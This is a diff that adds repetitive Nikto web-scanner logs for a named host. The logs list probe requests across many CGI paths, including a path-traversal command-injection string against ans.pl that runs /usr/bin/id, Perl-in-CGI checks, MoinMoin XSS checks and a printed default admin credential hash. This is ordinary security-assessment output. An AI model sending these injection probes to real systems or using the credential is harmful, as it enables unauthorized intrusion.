@@ -1,0 +1,144 @@
+- Nikto v2.1.5/2.1.5
++ Target Host: am6rzroksejddp.adjustnetwork.co.in
++ Target Port: 80
++ GET /: The anti-clickjacking X-Frame-Options header is not present.
++ -3092: GET /css: /css: This might be interesting...
++ -724: GET /ans.pl?p=../../../../../usr/bin/id|&blah: /ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.  http://ans.gq.nu/ default admin string 'admin:aaLR8vE.jjhss:root@127.0.0.1', password file location 'ans_data/ans.passwd'
++ -724: GET /ans/ans.pl?p=../../../../../usr/bin/id|&blah: /ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
+- Nikto v2.1.5/2.1.5
++ Target Host: am6rzroksejddp.adjustnetwork.co.in
++ Target Port: 80
++ GET /: The anti-clickjacking X-Frame-Options header is not present.
+- Nikto v2.1.5/2.1.5
++ Target Host: am6rzroksejddp.adjustnetwork.co.in
++ Target Port: 80
++ GET /: The anti-clickjacking X-Frame-Options header is not present.
++ -2878: GET /cgi.cgi/moin.cgi?test: /cgi.cgi/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /webcgi/moin.cgi?test: /webcgi/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /cgi-914/moin.cgi?test: /cgi-914/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /cgi-915/moin.cgi?test: /cgi-915/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /bin/moin.cgi?test: /bin/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /cgi/moin.cgi?test: /cgi/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /mpcgi/moin.cgi?test: /mpcgi/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /cgi-bin/moin.cgi?test: /cgi-bin/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /ows-bin/moin.cgi?test: /ows-bin/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /cgi-sys/moin.cgi?test: /cgi-sys/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /cgi-local/moin.cgi?test: /cgi-local/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /htbin/moin.cgi?test: /htbin/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /cgibin/moin.cgi?test: /cgibin/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /cgis/moin.cgi?test: /cgis/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /scripts/moin.cgi?test: /scripts/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /cgi-win/moin.cgi?test: /cgi-win/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /fcgi-bin/moin.cgi?test: /fcgi-bin/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /cgi-exe/moin.cgi?test: /cgi-exe/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /cgi-home/moin.cgi?test: /cgi-home/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /cgi-perl/moin.cgi?test: /cgi-perl/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -2878: GET /scgi-bin/moin.cgi?test: /scgi-bin/moin.cgi?test: MoinMoin 1.1 and prior contain at least two XSS vulnerabilities. Version 1.0 and prior also contains a XSLT related vulnerability
++ -724: GET /cgi.cgi/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi.cgi/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /webcgi/ans.pl?p=../../../../../usr/bin/id|&blah: /webcgi/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-914/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-914/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-915/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-915/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /bin/ans.pl?p=../../../../../usr/bin/id|&blah: /bin/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /mpcgi/ans.pl?p=../../../../../usr/bin/id|&blah: /mpcgi/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /ows-bin/ans.pl?p=../../../../../usr/bin/id|&blah: /ows-bin/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-sys/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-sys/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-local/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-local/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /htbin/ans.pl?p=../../../../../usr/bin/id|&blah: /htbin/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgibin/ans.pl?p=../../../../../usr/bin/id|&blah: /cgibin/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgis/ans.pl?p=../../../../../usr/bin/id|&blah: /cgis/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /scripts/ans.pl?p=../../../../../usr/bin/id|&blah: /scripts/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-win/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-win/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /fcgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah: /fcgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-exe/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-exe/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-home/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-home/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-perl/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-perl/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /scgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah: /scgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi.cgi/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi.cgi/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /webcgi/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /webcgi/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-914/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-914/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-915/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-915/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /mpcgi/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /mpcgi/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /ows-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /ows-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-sys/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-sys/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-local/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-local/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /htbin/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /htbin/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgibin/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /cgibin/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgis/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /cgis/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /scripts/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /scripts/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-win/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-win/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /fcgi-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /fcgi-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-exe/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-exe/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-home/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-home/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /cgi-perl/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /cgi-perl/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ -724: GET /scgi-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah: /scgi-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ GET /cgi.cgi/perl?-v: /cgi.cgi/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /webcgi/perl?-v: /webcgi/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /cgi-914/perl?-v: /cgi-914/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /cgi-915/perl?-v: /cgi-915/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /bin/perl?-v: /bin/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /cgi/perl?-v: /cgi/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /mpcgi/perl?-v: /mpcgi/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /cgi-bin/perl?-v: /cgi-bin/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /ows-bin/perl?-v: /ows-bin/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /cgi-sys/perl?-v: /cgi-sys/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /cgi-local/perl?-v: /cgi-local/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /htbin/perl?-v: /htbin/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /cgibin/perl?-v: /cgibin/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /cgis/perl?-v: /cgis/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /scripts/perl?-v: /scripts/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /cgi-win/perl?-v: /cgi-win/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /fcgi-bin/perl?-v: /fcgi-bin/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /cgi-exe/perl?-v: /cgi-exe/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /cgi-home/perl?-v: /cgi-home/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /cgi-perl/perl?-v: /cgi-perl/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /scgi-bin/perl?-v: /scgi-bin/perl?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove Perl from the CGI dir.
++ GET /cgi.cgi/perl.exe?-v: /cgi.cgi/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /webcgi/perl.exe?-v: /webcgi/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /cgi-914/perl.exe?-v: /cgi-914/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /cgi-915/perl.exe?-v: /cgi-915/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /bin/perl.exe?-v: /bin/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /cgi/perl.exe?-v: /cgi/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /mpcgi/perl.exe?-v: /mpcgi/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /cgi-bin/perl.exe?-v: /cgi-bin/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /ows-bin/perl.exe?-v: /ows-bin/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /cgi-sys/perl.exe?-v: /cgi-sys/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /cgi-local/perl.exe?-v: /cgi-local/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /htbin/perl.exe?-v: /htbin/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /cgibin/perl.exe?-v: /cgibin/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /cgis/perl.exe?-v: /cgis/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /scripts/perl.exe?-v: /scripts/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /cgi-win/perl.exe?-v: /cgi-win/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /fcgi-bin/perl.exe?-v: /fcgi-bin/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /cgi-exe/perl.exe?-v: /cgi-exe/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /cgi-home/perl.exe?-v: /cgi-home/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /cgi-perl/perl.exe?-v: /cgi-perl/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ GET /scgi-bin/perl.exe?-v: /scgi-bin/perl.exe?-v: Perl is installed in the CGI directory. This essentially gives attackers a system shell. Remove perl.exe from the CGI dir.
++ -10944: GET /cgi.cgi/: /cgi.cgi/: text goes here
++ -10944: GET /webcgi/: /webcgi/: text goes here
++ -10944: GET /cgi-914/: /cgi-914/: text goes here
++ -10944: GET /cgi-915/: /cgi-915/: text goes here
++ -10944: GET /bin/: /bin/: text goes here
++ -10944: GET /cgi/: /cgi/: text goes here
++ -10944: GET /mpcgi/: /mpcgi/: text goes here
++ -10944: GET /cgi-bin/: /cgi-bin/: text goes here
++ -10944: GET /ows-bin/: /ows-bin/: text goes here
++ -10944: GET /cgi-sys/: /cgi-sys/: text goes here
++ -10944: GET /cgi-local/: /cgi-local/: text goes here
++ -10944: GET /htbin/: /htbin/: text goes here
++ -10944: GET /cgibin/: /cgibin/: text goes here
++ -10944: GET /cgis/: /cgis/: text goes here
++ -10944: GET /scripts/: /scripts/: text goes here
++ -10944: GET /cgi-win/: /cgi-win/: text goes here
++ -10944: GET /fcgi-bin/: /fcgi-bin/: text goes here
++ -10944: GET /cgi-exe/: /cgi-exe/: text goes here
++ -10944: GET /cgi-home/: /cgi-home/: text goes here
++ -10944: GET /cgi-perl/: /cgi-perl/: text goes here
++ -10944: GET /scgi-bin/: /scgi-bin/: text goes here
++ -3092: GET /css: /css: This might be interesting...
++ -724: GET /ans.pl?p=../../../../../usr/bin/id|&blah: /ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.  http://ans.gq.nu/ default admin string 'admin:aaLR8vE.jjhss:root@127.0.0.1', password file location 'ans_data/ans.passwd'
++ -724: GET /ans/ans.pl?p=../../../../../usr/bin/id|&blah: /ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
